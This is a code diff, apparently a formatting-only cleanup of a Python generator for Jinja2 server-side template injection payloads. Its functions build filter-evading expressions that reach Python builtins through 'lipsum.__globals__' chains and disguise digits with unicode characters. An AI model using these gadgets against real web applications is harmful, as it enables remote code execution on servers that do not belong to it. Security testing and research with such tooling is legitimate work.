@@ -252,13 +252,7 @@ def tree_precedence(tree):
     for target, sub_target_tree in tree:
         if target[0] in [LITERAL, UNSATISFIED]:
             pass
-        elif target[0] in [
-            PLUS,
-            MULTIPLY,
-            MOD,
-            ATTRIBUTE,
-            ITEM
-        ]:
+        elif target[0] in [PLUS, MULTIPLY, MOD, ATTRIBUTE, ITEM]:
             # might be transformed into filters
             sub_target_answer = tree_precedence(sub_target_tree)
             if sub_target_answer:
@@ -282,12 +276,10 @@ def str_escape(value: str, quote="'"):
     return value.replace("\\", "\\\\").replace(quote, "\\" + quote)
 
 
-def transform_int_chars_charcodes(int_chars, charcodes, keepfirst = False):
-    charcode_dict = {
-        str(int(chr(x), 0)): chr(x)
-        for x in charcodes
-    }
+def transform_int_chars_charcodes(int_chars, charcodes, keepfirst=False):
+    charcode_dict = {str(int(chr(x), 0)): chr(x) for x in charcodes}
     return "".join(charcode_dict.get(c, c) for c in int_chars)
+
 
 def transform_int_chars_unicode(int_chars):
     return [
@@ -295,10 +287,12 @@ def transform_int_chars_unicode(int_chars):
         for charcodes in UNICODE_INT_CHARCODES
     ]
 
+
 class CacheByRepr:
     """缓存传入的对象，其中键可以是任意对象
     会将键的repr表达式作为键进行存储
     """
+
     def __init__(self):
         self.cache = {}
 
@@ -489,7 +483,7 @@ class PayloadGenerator:
                 ),
                 result_precedence,
                 target[1],
-                pformat(target[2])
+                pformat(target[2]),
             )
         return str_result, used_context, tree
 
@@ -874,6 +868,7 @@ def gen_function_call_forfilter1(context: dict, function_target, args_target_lis
     )
     return [(EXPRESSION, precedence["filter_with_function_call"], target_list)]
 
+
 @expression_gen
 def gen_function_call_forfilter2(context: dict, function_target, args_target_list):
     target_list = (
@@ -888,7 +883,6 @@ def gen_function_call_forfilter2(context: dict, function_target, args_target_lis
         ]
     )
     return [(EXPRESSION, precedence["filter_with_function_call"], target_list)]
-
 
 
 @expression_gen
@@ -1096,12 +1090,15 @@ def gen_positive_integer_unicode(context: dict, value: int):
     if value <= 9:
         return [(UNSATISFIED,)]
     payload_targets = [
-        [(LITERAL, payload)]
-        for payload in transform_int_chars_unicode(str(value)[1:])
+        [(LITERAL, payload)] for payload in transform_int_chars_unicode(str(value)[1:])
     ]
-    return [(EXPRESSION, precedence["literal"], [
-        (LITERAL, str(value)[0]), (ONEOF,*payload_targets)
-    ])] + [(REQUIRE_PYTHON3, )]
+    return [
+        (
+            EXPRESSION,
+            precedence["literal"],
+            [(LITERAL, str(value)[0]), (ONEOF, *payload_targets)],
+        )
+    ] + [(REQUIRE_PYTHON3,)]
 
 
 @expression_gen
@@ -1114,7 +1111,7 @@ def gen_positive_integer_unicodehex(context: dict, value: int):
         for payload in transform_int_chars_unicode(value_hex_literal)
     ]
     targets_list = [(LITERAL, "0x"), (ONEOF, *payload_targets)]
-    return [(EXPRESSION, precedence["literal"], targets_list)] + [(REQUIRE_PYTHON3, )]
+    return [(EXPRESSION, precedence["literal"], targets_list)] + [(REQUIRE_PYTHON3,)]
 
 
 @expression_gen
@@ -2084,6 +2081,7 @@ def gen_string_underline_tupleselect(context):
     ]
     return [(EXPRESSION, precedence["filter"], target_list)]
 
+
 @expression_gen
 def gen_string_underline_gget(context):
     # g|attr("get")|e|batch(18)|first|last
@@ -2096,7 +2094,6 @@ def gen_string_underline_gget(context):
         (LITERAL, ")|first|last"),
     ]
     return [(EXPRESSION, precedence["filter"], target_list)]
-
 
 
 # ---
@@ -2758,19 +2755,17 @@ def gen_string_lipsumtobytes4(context: dict, value: str):
         + join_target(sep=(LITERAL, ","), targets=[(INTEGER, ord(c)) for c in value])
         + [(LITERAL, ")")]
     )
-    bytes_targets_noendbracket = (
-        [
-            (LITERAL, "lipsum["),
-            (VARIABLE_OF, "__globals__"),
-            (LITERAL, "]["),
-            (VARIABLE_OF, "__builtins__"),
-            (LITERAL, "]["),
-            (VARIABLE_OF, "bytes"),
-            (LITERAL, "]("),
-        ]
-        + value_tpl
-    )
-    functioncall = (ONEOF,
+    bytes_targets_noendbracket = [
+        (LITERAL, "lipsum["),
+        (VARIABLE_OF, "__globals__"),
+        (LITERAL, "]["),
+        (VARIABLE_OF, "__builtins__"),
+        (LITERAL, "]["),
+        (VARIABLE_OF, "bytes"),
+        (LITERAL, "]("),
+    ] + value_tpl
+    functioncall = (
+        ONEOF,
         [(LITERAL, "()")],
         [(LITERAL, "( )")],
         [(LITERAL, "(\n)")],
@@ -2781,22 +2776,24 @@ def gen_string_lipsumtobytes4(context: dict, value: str):
         (LITERAL, "["),
         (VARIABLE_OF, "decode"),
         (LITERAL, "]"),
-        functioncall
+        functioncall,
     ]
     target_list2 = bytes_targets_noendbracket + [
         (LITERAL, ",)"),
         (LITERAL, "["),
         (VARIABLE_OF, "decode"),
         (LITERAL, "]"),
-        functioncall
+        functioncall,
     ]
     return [
         (
             EXPRESSION,
             precedence["function_call"],
-            [(ONEOF, target_list1, target_list2), ]
+            [
+                (ONEOF, target_list1, target_list2),
+            ],
         )
-    ] + [(REQUIRE_PYTHON3, )]
+    ] + [(REQUIRE_PYTHON3,)]
 
 
 @expression_gen
@@ -2806,50 +2803,49 @@ def gen_string_lipsumtobytes5(context: dict, value: str):
         + join_target(sep=(LITERAL, ","), targets=[(INTEGER, ord(c)) for c in value])
         + [(LITERAL, ")")]
     )
-    bytes_targets_noendbracket = (
-        [
-            (LITERAL, "lipsum|attr("),
-            (VARIABLE_OF, "__globals__"),
-            (LITERAL, ")|attr("),
-            (VARIABLE_OF, "__getitem__"),
-            (LITERAL, ")("),
-            (VARIABLE_OF, "__builtins__"),
-            (LITERAL, ")|attr("),
-            (VARIABLE_OF, "__getitem__"),
-            (LITERAL, ")("),
-            (VARIABLE_OF, "bytes"),
-            (LITERAL, ")("),
-        ]
-        + value_tpl
-    )
-    functioncall = (ONEOF,
+    bytes_targets_noendbracket = [
+        (LITERAL, "lipsum|attr("),
+        (VARIABLE_OF, "__globals__"),
+        (LITERAL, ")|attr("),
+        (VARIABLE_OF, "__getitem__"),
+        (LITERAL, ")("),
+        (VARIABLE_OF, "__builtins__"),
+        (LITERAL, ")|attr("),
+        (VARIABLE_OF, "__getitem__"),
+        (LITERAL, ")("),
+        (VARIABLE_OF, "bytes"),
+        (LITERAL, ")("),
+    ] + value_tpl
+    functioncall = (
+        ONEOF,
         [(LITERAL, "()")],
         [(LITERAL, "( )")],
         [(LITERAL, "(\n)")],
         [(LITERAL, "(\t)")],
     )
     target_list1 = bytes_targets_noendbracket + [
-            (LITERAL, ")"),
-            (LITERAL, "|attr("),
-            (VARIABLE_OF, "decode"),
-            (LITERAL, ")"),
-            functioncall
-        ]
+        (LITERAL, ")"),
+        (LITERAL, "|attr("),
+        (VARIABLE_OF, "decode"),
+        (LITERAL, ")"),
+        functioncall,
+    ]
     target_list2 = bytes_targets_noendbracket + [
-            (LITERAL, ",)"),
-            (LITERAL, "|attr("),
-            (VARIABLE_OF, "decode"),
-            (LITERAL, ")"),
-            functioncall
-        ]
+        (LITERAL, ",)"),
+        (LITERAL, "|attr("),
+        (VARIABLE_OF, "decode"),
+        (LITERAL, ")"),
+        functioncall,
+    ]
     return [
         (
             EXPRESSION,
             precedence["filter"],
-            [(ONEOF, target_list1, target_list2), ]
+            [
+                (ONEOF, target_list1, target_list2),
+            ],
         )
-    ] + [(REQUIRE_PYTHON3, )]
-
+    ] + [(REQUIRE_PYTHON3,)]
 
 
 @expression_gen
@@ -3113,6 +3109,7 @@ def gen_item_dunderfunc2(context, obj_req, item_name):
     ]
     target = (ONEOF, target_head + [(LITERAL, ")")], target_head + [(LITERAL, ",)")])
     return [(EXPRESSION, precedence["function_call"], [target])]
+
 
 # ---
 
